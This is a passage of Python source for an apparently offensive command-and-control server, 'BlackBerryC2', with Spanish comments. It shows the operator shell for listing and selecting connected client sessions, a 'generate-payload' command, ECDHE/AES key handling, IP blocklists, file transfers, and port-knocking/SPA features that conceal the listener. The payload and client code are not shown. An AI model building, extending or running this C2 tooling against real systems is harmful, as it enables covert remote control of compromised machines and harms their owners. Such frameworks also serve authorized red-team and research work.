                            print(f"  {B_MAGENTA}C Sent:{RESET} {format_bytes(sent_comp)}  |  {B_MAGENTA}C Recv:{RESET} {format_bytes(recv_comp)}")
                            print(f"  {B_CYAN}Heartbeats:{RESET} {B_GREEN}{hb_count}{RESET}  |  {B_CYAN}Viva:{RESET} {format_uptime(age)}")
                            print(f"  {B_CYAN}Queue:{RESET} {queue_size}/{MAX_RESPONSE_QUEUE_SIZE}  |  {B_CYAN}Dropped:{RESET} {messages_dropped}")
                            
                            # Advertencia si hay flood violations
                            if flood_violations > 0:
                                print(f"      {RED}⚠ Flood violations: {flood_violations}/{MAX_FLOOD_VIOLATIONS}{RESET}")
                            if messages_dropped > 100:
                                print(f"      {RED}⚠ Demasiados mensajes descartados: {messages_dropped}{RESET}")
                                
                            print(f"\n{B_CYAN}{'-'*50}{RESET}")
                        print()
            except Exception as e:
                logging.exception(f"Error listando conexiones: {e}")
                print(f"{ALERT} {RED}Error listando conexiones: {e}{RESET}")
            continue

        elif cmd in ("new-cert", "cert new"):
            try:
                import certG
                certG.generate_certificates()
            except KeyboardInterrupt:
                print()
                continue
            except FileNotFoundError:
                print(f"{ALERT} {RED}Error: No se encontró certG.py{RESET}")
            except AttributeError:
                print(f"{ALERT} {RED}Error: certG.py no tiene la función generate_certificates(){RESET}")
            except Exception as e:
                logging.exception(f"Error ejecutando certG.py: {e}")
                print(f"{ALERT} {RED}Error ejecutando certG.py: {e}{RESET}")

        elif cmd == "cert":
            try:
                CERT_PATH = f'{script_dir}/cert/BlackBerryC2_Proxy.crt'
                KEY_PATH  = f'{script_dir}/cert/BlackBerryC2_Proxy.key'
                print("="*85)
                mostrar_info_cert(CERT_PATH)
                mostrar_info_key(KEY_PATH)
            except Exception as e:
                logging.exception(f"Error mostrando certificados: {e}")
                print(f"{ALERT} {RED}Error mostrando certificados: {e}{RESET}")

        elif cmd == "ecdhe-keys":
            try:
                priv_pem = SERVER_PRIVATE_KEY.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                )
                print(f"{B_GREEN}--- ECDHE Private Key (PEM) ---{RESET}\n{priv_pem.decode()}")
                print(f"{B_GREEN}--- ECDHE Public Key (PEM) ---{RESET}\n{SERVER_PUBLIC_PEM.decode()}")
            except Exception as e:
                logging.exception(f"Error mostrando claves ECDHE: {e}")
                print(f"{ALERT} {RED}Error mostrando claves ECDHE: {e}{RESET}")

        elif cmd.startswith("select "):
            parts = cmd.split()
            if len(parts) != 2:
                print(f"{ALERT} {RED}Uso: select <ID>{RESET}")
                continue
            try:
                cid = int(parts[1])
            except ValueError:
                print(f"{ALERT} {RED}ID inválido.{RESET}")
                continue

            with conn_lock:
                if cid not in connections:
                    print(f"{ALERT} {RED}Conexión no encontrada.{RESET}")
                    continue
                session = connections[cid]

            interact_with_client(cid, session)
            continue

        elif cmd.startswith("set port "):
            parts = cmd.split()
            if len(parts) != 3:
                print(f"{ALERT} {RED}Uso: set port <PUERTO>{RESET}")
                continue
            try:
                new_port = int(parts[2])
                if not (1 <= new_port <= 65535):
                    print(f"{ALERT} {RED}Puerto debe estar entre 1 y 65535{RESET}")
                    continue
                rebind_server(HOST, new_port)
            except ValueError:
                print(f"{ALERT} {RED}El puerto debe ser un número entero.{RESET}")
            except Exception as e:
                logging.exception(f"Error cambiando puerto: {e}")
                print(f"{ALERT} {RED}Error cambiando puerto: {e}{RESET}")
            continue

        elif cmd.startswith("set host "):
            parts = cmd.split()
            if len(parts) != 3:
                print(f"{ALERT} {RED}Uso: set host <HOST>{RESET}")
                continue
            new_host = parts[2]
            try:
                rebind_server(new_host, PORT)
            except Exception as e:
                logging.exception(f"Error cambiando host: {e}")
                print(f"{ALERT} {RED}Error cambiando host: {e}{RESET}")
            continue

        elif cmd == "generate-payload" or cmd == "payload":
            try:
                import payloadG
                # Pasar el puerto del servidor y el directorio actual para obtener fingerprint correcto
                # y generar el payload en el directorio de trabajo actual del servidor
                payloadG.generate_payload(server_port=PORT, output_dir=CURRENT_WORKING_DIR)
            except KeyboardInterrupt:
                print()
                continue
            except ImportError:
                print(f"{ALERT} {RED}Error: No se encontró el módulo payloadG.{RESET}")
                print(f"{INFO} {YELLOW}Asegúrate de que payloadG.py esté en el mismo directorio{RESET}")
            except Exception as e:
                logging.exception(f"Error generando payload: {e}")
                print(f"{ALERT} {RED}Error generando payload: {e}{RESET}")
            continue

        elif base_cmd == "kill":
            kill_connection_command(parts[1:])
            continue

        elif base_cmd == "block" and len(parts) == 2:
            ip = parts[1]
            if block_ip(ip):
                print(f"{B_GREEN}[+] Proceso de bloqueo completado para {ip}{RESET}")
            else:
                print(f"{RED}Error bloqueando {ip}{RESET}")

        elif base_cmd == "unblock" and len(parts) == 2:
            ip = parts[1]
            if unblock_ip(ip):
                print(f"{B_GREEN}[+] Proceso de desbloqueo completado para {ip}{RESET}")
            else:
                print(f"{RED}Error desbloqueando {ip}{RESET}")

        elif base_cmd == "blocked" or base_cmd == "blocklist":
            try:
                with blocked_ips_lock, temp_bans_lock:
                    print(f"{B_CYAN}=== Bloqueos persistentes ==={RESET}")
                    if blocked_ips:
                        for ip in sorted(blocked_ips):
                            print(f" - {ip}")
                    else:
                        print(" (ninguna)")

                    print(f"\n{B_YELLOW}=== Bloqueos temporales ==={RESET}")
                    now = time.time()
                    if temp_bans:
                        for ip, exp in temp_bans.items():
                            remaining = int(exp - now)
                            if remaining > 0:
                                print(f" - {ip} (expira en {remaining}s)")
                    else:
                        print(" (ninguna)")
            except Exception as e:
                logging.exception(f"Error mostrando blocklist: {e}")
            continue
        
        elif cmd == "save-blocklist":
            if save_blocked_ips():
                print(f"{B_GREEN}[+] Lista de IPs guardada{RESET}")
            else:
                print(f"{ALERT} {RED}Error guardando lista de IPs{RESET}")
            continue

        elif cmd == "version":
            print("BlackBerryC2v2.0 ECDHE+AES-256-GCM+HMAC")

        elif cmd in ["security", "sec-status", "sec"]:
            print(f"\n{B_YELLOW}[ESTADÍSTICAS POR SESIÓN]{RESET}")
            with conn_lock:
                if connections:
                    for cid, session in connections.items():
                        ip = session.address[0]
                        violations = session.heartbeat_violations
                        hb_count = session.heartbeat_count
                        key_bits = len(session.aes_key) * 8
                        
                        print(f"\n  Sesión #{cid} ({ip}):")
                        print(f"    - AES Key: {key_bits} bits")
                        print(f"    - Heartbeats: {hb_count}")
                        print(f"    - Rate limit violations: {violations}")
                        if violations > 0:
                            print(f"      {RED}⚠ Cliente sospechoso de flood attack{RESET}")
                else:
                    print(f"  {YELLOW}No hay sesiones activas{RESET}")
            
            print(f"\n{B_CYAN}{'='*70}{RESET}\n")
            continue

        elif cmd.lower() == "transfers":
            print_transfers(show_done=True)
            continue

        elif cmd.lower().startswith("stop "):
            tid = cmd.split(maxsplit=1)[1].strip().upper()
            if not tid.startswith("T"):
                tid = "T" + tid
            if bg_cancel(tid):
                print(f"{B_YELLOW}[{tid}] Señal de cancelación enviada{RESET}")
            else:
                xfer = bg_get(tid)
                if xfer:
                    print(f"{B_YELLOW}[{tid}] La transferencia ya está: {xfer.status}{RESET}")
                else:
                    print(f"{ALERT} {RED}Transferencia '{tid}' no encontrada{RESET}")
            continue

        elif cmd.lower() == "exit":
            cleanup_history()
            print(f"{YELLOW}{BOLD}Saliendo de BlackBerry...{RESET}")
    
            # Detener proxy si está corriendo
            if tls_proxy and tls_proxy._running:
                print(f"{B_CYAN}[*] Deteniendo proxy daemon...{RESET}")
                try:
                    tls_proxy.stop()
                    print(f"{B_GREEN}[+] Proxy detenido{RESET}")
                except Exception as e:
                    logging.error(f"Error deteniendo proxy: {e}")
    
            # Cerrar conexiones de clientes
            with conn_lock:
                for cid, session in list(connections.items()):
                    try:
                        session.socket.close()
                    except:
                        pass
                connections.clear()
    
            # Cerrar socket del servidor
            with server_socket_lock:
                if server_socket:
                    try:
                        server_socket.close()
                    except:
                        pass

            print(f"{B_GREEN}[+] hasta luego :)!{RESET}")
            sys.exit(0)
        else:
            result = execute_local_command_safe(cmd)
            print(result)

    finally:
        # Liberar patch_stdout si estaba activo
        if _patch_ctx is not None:
            try:
                _patch_ctx.__exit__(None, None, None)
            except Exception:
                pass

def parse_arguments():
    """Parsea argumentos de línea de comandos"""
    parser = argparse.ArgumentParser(
        description='BlackBerryC2_server v2.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  python3 BlackBerry.py                                  # Modo silencioso por defecto
  python3 BlackBerry.py -p                               # ECDHE persistente (pide passphrase)
  python3 BlackBerry.py -v                               # Modo DEBUG completo
  python3 BlackBerry.py -vv                              # Modo VERBOSE relajado
  python3 BlackBerry.py -p -vv                           # ECDHE persistente + verbose
  python3 BlackBerry.py --host 192.168.1.5               # Host específico
  python3 BlackBerry.py --port 8080                      # Puerto específico
  python3 BlackBerry.py --no-secure                      # Acepta clientes sin verificar HMAC
  python3 BlackBerry.py --secret-hmac "mi_secreto"       # HMAC personalizado

  # SPA (Single Packet Authorization) — un paquete UDP firmado:
  python3 BlackBerry.py --spa                            # Activa SPA en puerto 7331
  python3 BlackBerry.py --spa --spa-port 4141            # SPA en puerto 4141

  # Port-knocking — secuencia de puertos UDP en orden:
  python3 BlackBerry.py --spa --spa-mode knock           # Knock: 7001→7002→7003
  python3 BlackBerry.py --spa --spa-mode knock --knock-seq 9001,9002,9003,9004

  # Combinar todo:
  python3 BlackBerry.py -p --spa --spa-mode knock --knock-seq 5000,6000,7000 --secret-hmac "clave"
        """
    )
    
    parser.add_argument('-p', '--persistente', action='store_true',
                       help='Usar claves ECDHE persistentes desde ecdhe-cert/ (pide passphrase)')
    parser.add_argument('-v', '--verbose', action='count', default=0,
                       help='Aumentar verbosidad (-v=DEBUG, -vv=VERBOSE)')
    parser.add_argument('-H', '--host', type=str, default='0.0.0.0',
                       help='Host de escucha (default: 0.0.0.0)')
    parser.add_argument('-P', '--port', type=int, default=9949,
                       help='Puerto de escucha (default: 9949)')
    parser.add_argument('--log-passphrase', type=str, default=None, dest='log_passphrase',
                       help='Cifrar el log con esta clave (sin este flag: log texto plano, sin prompts)')
    parser.add_argument('--logs', action='store_true', dest='view_logs',
                       help='Ver/descifrar logs interactivamente sin iniciar el servidor.')
    parser.add_argument('--no-secure', action='store_true', dest='no_secure',
                       help='Modo inseguro: acepta cualquier cliente ECDHE sin verificar HMAC')
    parser.add_argument('--hmac', type=str, default=None, dest='secret_hmac',
                       help='Secreto HMAC para autenticar clientes')

    # ── SPA / Knock ──────────────────────────────────────────────────────────
    parser.add_argument('--spa', action='store_true',
                        help='Activar SPA/Port-knocking (default: SPA modo token-HMAC)')
    parser.add_argument('--spa-mode', type=str, default='spa', dest='spa_mode',
                        choices=['spa', 'knock'],
                        help='"spa" = un paquete UDP firmado  |  "knock" = secuencia de puertos')
    parser.add_argument('--spa-port', type=int, default=7331, dest='spa_port',
                        help='Puerto UDP para el listener SPA (modo "spa", default: 7331)')
    parser.add_argument('--knock-seq', type=str, default='7001,7002,7003', dest='knock_seq',
                        help='Secuencia de puertos UDP para port-knocking (default: 7001,7002,7003)')
    parser.add_argument('--knock-timeout', type=float, default=10.0, dest='knock_timeout',
                        help='Segundos para completar la secuencia de knock (default: 10)')
    parser.add_argument('--spa-ttl', type=int, default=60, dest='spa_ttl',
                        help='Segundos que la IP queda autorizada tras SPA/knock (default: 60)')

    # ── BerryTransfer ─────────────────────────────────────────────────────────
    parser.add_argument('--berrytransfer', action='store_true', dest='berrytransfer',
                        help='Activar modo BerryTransfer: solo acepta conexiones de '
                             'transferencia de archivos (scp-style). Sin acceso shell.')
    parser.add_argument('--transfer-root', type=str, default='./berry_transfers',
                        dest='transfer_root',
                        help='Directorio raíz donde se guardan/sirven archivos en modo '
                             'BerryTransfer (default: ./berry_transfers)')
    parser.add_argument('--auto-confirm', action='store_true', dest='auto_confirm',
                        help='[BerryTransfer] Aprobar automáticamente TODAS las solicitudes '
                             'GET sin pedir confirmación del operador')
    # ─────────────────────────────────────────────────────────────────────────

    return parser.parse_args()

def main():
    BlackBerrybanner()
    global server_socket, SERVER_PRIVATE_KEY, SERVER_PUBLIC_PEM, VERBOSE_MODE, HOST, PORT
    global NO_SECURE_MODE, HMAC_PRE_SHARED_SECRET, ECDHE_KEY_PASSPHRASE
    global SPA_ENABLED, SPA_MODE, SPA_UDP_PORT, KNOCK_SEQUENCE, KNOCK_TIMEOUT, SPA_AUTHZ_TTL
    global _SESSION_LOG_KEY
    global BERRYTRANSFER_MODE, BERRYTRANSFER_ROOT, BT_AUTO_CONFIRM

    try:
        args = parse_arguments()

        # ── Modo visor de logs — sin iniciar el servidor ─────────────────────
        if args.view_logs:
            _pp = args.log_passphrase
            _salt_path = os.path.join(script_dir, "logs", "sessions.salt")
            if _pp is None and os.path.exists(_salt_path):
                # Solo pedir si hay logs cifrados
                try:
                    _pp = getpass.getpass("    Log passphrase: ")
                except (KeyboardInterrupt, EOFError):
                    _pp = ""
            if _pp and _pp.strip():
                if os.path.exists(_salt_path):
                    with open(_salt_path, 'rb') as _f: _s = _f.read()
                    if len(_s) == 16:
                        _kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32,
                                          salt=_s, iterations=600_000)
                        _SESSION_LOG_KEY = _kdf.derive(_pp.strip().encode())
            show_logs_menu()
            return 0

        persistent_mode = args.persistente
        VERBOSE_MODE    = min(args.verbose, 2)
        HOST            = args.host
        PORT            = args.port
        NO_SECURE_MODE  = args.no_secure

        # ── SPA / Knock ──────────────────────────────────────────────────────
        SPA_ENABLED   = args.spa
        SPA_MODE      = args.spa_mode
        SPA_UDP_PORT  = args.spa_port
        SPA_AUTHZ_TTL = args.spa_ttl
        KNOCK_TIMEOUT = args.knock_timeout
        try:
            KNOCK_SEQUENCE = [int(p.strip()) for p in args.knock_seq.split(',') if p.strip()]
            if not KNOCK_SEQUENCE:
                raise ValueError
        except ValueError:
            print(f"\033[91m[!] --knock-seq inválido. Formato: 7001,7002,7003\033[0m")
            return 1

        # ── BerryTransfer ─────────────────────────────────────────────────────
        BERRYTRANSFER_MODE = args.berrytransfer
        BERRYTRANSFER_ROOT = args.transfer_root
        BT_AUTO_CONFIRM    = getattr(args, 'auto_confirm', False)
        if BERRYTRANSFER_MODE:
            os.makedirs(BERRYTRANSFER_ROOT, exist_ok=True)
            print(f"\033[96m[🫐] Modo BerryTransfer activado — transfer-only\033[0m")
            print(f"\033[96m     Raíz      : {os.path.realpath(BERRYTRANSFER_ROOT)}\033[0m")
            ac_str = "SI (--auto-confirm)" if BT_AUTO_CONFIRM else "NO — confirma con: confirm <ID>"
            print(f"\033[96m     Auto-confirm: {ac_str}\033[0m")
        # ─────────────────────────────────────────────────────────────────────

        # ── HMAC secret ──────────────────────────────────────────────────────
        if args.secret_hmac:
            try:
                HMAC_PRE_SHARED_SECRET = bytes.fromhex(args.secret_hmac.strip())
            except ValueError:
                HMAC_PRE_SHARED_SECRET = args.secret_hmac.encode('utf-8')
            _hmac_token = args.secret_hmac.strip()
        else:
            _hmac_token = HMAC_PRE_SHARED_SECRET.hex()

        if PORT < 1 or PORT > 65535:
            print(f"\033[91mError: Puerto debe estar entre 1 y 65535\033[0m")
            return 1

        # ── Log passphrase ───────────────────────────────────────────────────
        _raw_log_pp = args.log_passphrase
        _sess_salt_path = os.path.join(script_dir, "logs", "sessions.salt")
        _sess_log_path  = os.path.join(script_dir, "logs", "sessions.jsonl")
        _already_encrypted = os.path.exists(_sess_salt_path)

        if _raw_log_pp is None:
            try:
                if _already_encrypted:
                    _raw_log_pp = getpass.getpass("    Log passphrase: ")
                else:
                    _raw_log_pp = getpass.getpass("    Log passphrase (vacío = logs sin cifrar): ")
            except (KeyboardInterrupt, EOFError):
                _raw_log_pp = ""

        # ── Si los logs ya están cifrados, la passphrase es OBLIGATORIA ────────
        if _already_encrypted and (not _raw_log_pp or not _raw_log_pp.strip()):
            print(f"\033[91m[!] Los logs ya están cifrados — passphrase obligatoria. Abortando.\033[0m")
            return 1

        if _raw_log_pp and _raw_log_pp.strip():
            _log_pp_bytes = _raw_log_pp.strip().encode('utf-8')
            os.makedirs(os.path.dirname(_sess_salt_path), exist_ok=True)

            if _already_encrypted:
                # Leer salt existente
                with open(_sess_salt_path, 'rb') as _f: _sess_salt = _f.read()
                if len(_sess_salt) != 16:
                    print(f"\033[91m[!] Salt corrupto — no se puede verificar passphrase.\033[0m")
                    return 1
                # Derivar clave candidata
                _kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32,
                                   salt=_sess_salt, iterations=600_000)
                _candidate_key = _kdf.derive(_log_pp_bytes)
                # Verificar contra la primera línea cifrada del log
                _verified = False
                if os.path.exists(_sess_log_path):
                    try:
                        with open(_sess_log_path, 'r', errors='replace') as _f:
                            for _line in _f:
                                _line = _line.strip()
                                if _line:
                                    import base64 as _b64
                                    _blob = _b64.b64decode(_line)
                                    AESGCM(_candidate_key).decrypt(_blob[:12], _blob[12:], None)
                                    _verified = True
                                    break
                    except Exception:
                        print(f"\033[91m[!] Passphrase incorrecta — acceso denegado.\033[0m")
                        return 1
                else:
                    # No hay líneas aún para verificar — aceptar (primer arranque cifrado sin eventos)
                    _verified = True

                if not _verified:
                    print(f"\033[91m[!] No se pudo verificar la passphrase.\033[0m")
                    return 1

                _SESSION_LOG_KEY = _candidate_key
            else:
                # Primera vez — generar nuevo salt
                _sess_salt = secrets.token_bytes(16)
                with open(_sess_salt_path, 'wb') as _f: _f.write(_sess_salt)
                try: os.chmod(_sess_salt_path, 0o600)
                except OSError: pass
                _kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32,
                                   salt=_sess_salt, iterations=600_000)
                _SESSION_LOG_KEY = _kdf.derive(_log_pp_bytes)

            setup_logging(verbose=VERBOSE_MODE, log_passphrase=_log_pp_bytes)
        else:
            setup_logging(verbose=VERBOSE_MODE, log_passphrase=None)
            if not _already_encrypted:
                print(f"\033[93m[!] Logs en texto plano\033[0m")

        if not PROMPT_TOOLKIT_AVAILABLE:
            print(f"\033[93m[!] prompt_toolkit no disponible — instala con: pip install prompt_toolkit\033[0m")

        # ── Passphrase para clave persistente ────────────────────────────────
        key_exists = (
            os.path.exists(ECDHE_PRIVATE_KEY_FILE) and
            os.path.exists(ECDHE_PUBLIC_KEY_FILE)
        )

        # ── Detectar si la clave ECDHE guardada está protegida con passphrase ──
        _ecdhe_key_is_encrypted = False
        if key_exists:
            try:
                with open(ECDHE_PRIVATE_KEY_FILE, 'rb') as _f:
                    _pem_data = _f.read()
                _ecdhe_key_is_encrypted = b'ENCRYPTED' in _pem_data
            except Exception:
                pass

        if persistent_mode:
            if not key_exists:
                print(f"\033[96m[*] Nueva clave ECDHE persistente.\033[0m")
                print(f"\033[93m    Deja vacío para guardar SIN contraseña (no recomendado)\033[0m")
            try:
                prompt_pp = "    Passphrase: " if key_exists else "    Nueva passphrase: "
                raw_pp = getpass.getpass(prompt_pp)
                if raw_pp.strip():
                    if not key_exists:
                        raw_pp2 = getpass.getpass("    Confirmar passphrase: ")
                        if raw_pp != raw_pp2:
                            print(f"\033[91m[!] Las passphrases no coinciden. Abortando.\033[0m")
                            return 1
                    ECDHE_KEY_PASSPHRASE = raw_pp.encode('utf-8')
                else:
                    # Si la clave ya está cifrada, passphrase es OBLIGATORIA
                    if _ecdhe_key_is_encrypted:
                        print(f"\033[91m[!] La clave ECDHE está cifrada — passphrase obligatoria. Abortando.\033[0m")
                        return 1
                    ECDHE_KEY_PASSPHRASE = None
            except (KeyboardInterrupt, EOFError):
                print(f"\n\033[91m[!] Cancelado.\033[0m")
                return 1

        try:
            SERVER_PRIVATE_KEY, SERVER_PUBLIC_PEM = load_or_generate_ecdhe_keys(
                persistent=persistent_mode,
                passphrase=ECDHE_KEY_PASSPHRASE
            )
        except ValueError as e:
            for line in str(e).splitlines():
                print(f"\033[91m{line}\033[0m")
            return 1
        except Exception as e:
            logging.critical("No se pudo generar/cargar claves ECDHE: %s", e)
            print(f"\033[91m[!] No se pudo inicializar claves ECDHE\033[0m")
            return 1

        load_blocked_ips()
        load_service_banner()

        try:
            with server_socket_lock:
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server_socket.bind((HOST, PORT))
                server_socket.listen(50)
            logging.info("Servidor escuchando en %s:%s", HOST, PORT)
            # ── Pantalla de inicio ───────────────────────────────────────────
            startup_display._log_encrypted = (_SESSION_LOG_KEY is not None)
            startup_display(HOST, PORT, _hmac_token, persistent_mode,
                            NO_SECURE_MODE, key_exists, VERBOSE_MODE)
            _save_startup_config(_hmac_token, HOST, PORT, persistent_mode, NO_SECURE_MODE)
            _log_session_event("server_start", extra={"port": PORT, "token": _hmac_token})
                
        except PermissionError:
            logging.critical("Permiso denegado para vincular a %s:%s", HOST, PORT)
            print(f"\033[91mError: Permiso denegado. ¿Puerto privilegiado?\033[0m")
            return 1
        except OSError as e:
            if "Address already in use" in str(e):
                logging.critical("Puerto %s ya en uso", PORT)
                print(f"\033[91mError: Puerto {PORT} ya en uso\033[0m")
            else:
                logging.critical("Error iniciando servidor: %s", e)
                print(f"\033[91mError fatal: {e}\033[0m")
            return 1
        except Exception as e:
            logging.critical("Error inesperado: %s", e)
            print(f"\033[91mError fatal iniciando servidor\033[0m")
            return 1

        # ── Arrancar SPA listener (si está activado) ────────────────────────
        start_spa_listener()

        threading.Thread(target=accept_connections, args=(server_socket,), daemon=True).start()
        
        try:
            if BERRYTRANSFER_MODE:
                bt_interactive_shell()
            else:
                interactive_shell()
        except Exception as e:
            logging.critical("Error en shell interactivo: %s", e)
            print(f"\033[91mError crítico en shell\033[0m")
            return 1
        
        return 0
    except Exception as e:
        logging.critical("Error crítico en main: %s", e)
        print(f"\033[91mError crítico: {e}\033[0m")
        return 1

if __name__ == '__main__':
    try:
        exit_code = main()
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Interrupción detectada. Saliendo...{RESET}")
        with conn_lock:
            for cid, session in list(connections.items()):
                try:
                    session.socket.close()
                except:
                    pass
        if server_socket:
            try:
                server_socket.close()
            except:
                pass
        sys.exit(0)
    except Exception as e:
        logging.critical("Excepción no capturada: %s", e, exc_info=True)
        print(f"{ALERT} {RED}Error crítico no manejado{RESET}")
        sys.exit(1)
